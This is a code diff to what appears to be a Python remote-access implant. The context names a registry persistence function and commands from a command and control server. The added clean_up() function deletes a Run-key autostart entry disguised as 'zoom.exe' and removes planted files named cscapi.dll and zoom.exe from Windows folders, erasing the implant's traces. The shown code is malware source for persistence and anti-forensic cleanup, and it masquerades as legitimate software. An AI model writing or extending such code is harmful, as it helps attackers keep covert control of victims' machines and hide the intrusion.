@@ -141,7 +141,30 @@ def persist_reg():
         print("An error occurred:", e)
 
 def clean_up():
-    pass
+
+    # delete the registery key
+    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
+    key_name = "zoom.exe"
+    try:
+        winreg.DeleteKey(key, key_name)
+        print("Registry key deleted successfully.")
+    except Exception as e:
+        print("An error occurred:", e)
+    winreg.CloseKey(key)
+
+    # Delete cscapi.dll and zoom.exe 
+    executables = ["C:\Windows\cscapi.dll", "C:\Windows\Temp\zoom.exe"]
+
+    for file in executables:
+        if os.path.exists(file):
+            # Remove the file
+            os.remove(file)
+            print(f"Deleted: {file}")
+        else:
+            print(f"File does not exist: {file}")
+
+
+    
     
 
 # Function to execute a command received from the command and control server
